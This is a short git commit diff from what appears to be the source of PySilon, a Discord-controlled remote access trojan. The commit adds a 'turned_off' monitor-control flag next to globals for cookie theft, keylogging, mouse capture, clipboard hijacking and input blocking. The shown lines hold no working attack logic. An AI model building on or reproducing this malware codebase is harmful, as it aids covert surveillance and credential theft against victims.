0c6dad6386340c63d809616d4b5e3ff930e32aa9
JuicyChann <nik.xeiladakis@gmail.com>
2023-09-23 16:57:55 +0300

    add monitor control

--- source.py
+++ source.py
@@ -115,7 +115,7 @@ messages_to_send, files_to_send, embeds_to_send = [], [], []
 processes_messages, processes_list, process_to_kill = [], [], ''
 files_to_merge, expectation, one_file_attachment_message = [[], [], []], None, None
 cookies_thread, implode_confirmation, cmd_messages = None, None, []
-send_recordings, input_blocked, clipper_stop, custom_message_to_send = True, False, True, [None, None, None]
+send_recordings, input_blocked, clipper_stop, turned_off, custom_message_to_send = True, False, True, False, [None, None, None]
 latest_messages_in_recordings = []
 # [pysilon_var] !registry 0
 
@@ -415,7 +415,7 @@ help = {
 
 @client.event
 async def on_message(message):
-    global channel_ids, vc, working_directory, tree_messages, messages_from_sending_big_file, files_to_merge, expectation, one_file_attachment_message, processes_messages, processes_list, process_to_kill, cookies_thread, implode_confirmation, cmd_messages, keyboard_listener, mouse_listener, clipper_stop, input_blocked, custom_message_to_send
+    global channel_ids, vc, working_directory, tree_messages, messages_from_sending_big_file, files_to_merge, expectation, one_file_attachment_message, processes_messages, processes_list, process_to_kill, cookies_thread, implode_confirmation, cmd_messages, keyboard_listener, mouse_listener, clipper_stop, input_blocked, custom_message_to_send, turned_off
     #.log New message logged
     if message.author != client.user:
         if message.content == f'<@{client.user.id}>':
